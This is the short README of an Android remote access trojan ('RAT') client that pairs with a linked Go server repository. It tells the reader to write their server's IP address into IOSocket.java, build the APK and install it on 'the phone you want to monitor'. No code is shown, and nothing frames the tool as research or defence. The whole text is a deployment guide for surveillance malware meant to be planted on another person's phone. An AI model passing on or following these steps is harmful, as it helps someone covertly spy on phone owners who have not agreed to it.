# Advanced-Android-Rat-Client
This is the android client for my another go repository https://github.com/diptomondal007/advanced-rat-server
Build this app in android studio with your server ip address in IOSocket.java file and build the apk.
Install the built apk in the phone you want to monitor and you are ready to go.
